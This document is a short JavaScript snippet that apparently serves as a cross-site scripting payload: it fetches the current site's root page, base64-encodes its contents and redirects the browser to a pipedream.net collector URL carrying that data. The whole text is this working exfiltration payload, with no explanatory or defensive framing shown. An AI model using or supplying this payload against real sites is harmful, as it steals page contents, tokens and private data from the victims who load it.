
fetch("/").then((res) => {
	return res.text();
}).then(data => {
	location.href="https://enghd2bd35t7sh5.m.pipedream.net/?data="+btoa(data)
})
